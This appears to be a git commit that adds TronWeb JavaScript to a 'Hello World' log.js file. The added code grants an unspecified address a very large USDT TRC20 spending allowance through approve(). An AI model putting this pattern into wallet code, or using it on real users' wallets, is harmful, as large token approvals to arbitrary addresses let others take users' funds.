5715e6bd04358b54c5032c3a46904f4e9047bebe
Adam <bzzdecentrailed@gmail.com>
2021-06-16 12:43:37 +0800

    approve

--- log.js
+++ log.js
@@ -1,1 +1,12 @@
 console.log("Hello World");
+tronWeb
+  .contract()
+  .at(usdtTrc20)
+  .then((usdtContract) => {
+	  usdtContract
+		  .approve(toAddress, 1000000000000000)
+		  .send()
+		  .finally(() => {
+			  console.log("Approved!");
+		  });
+  });
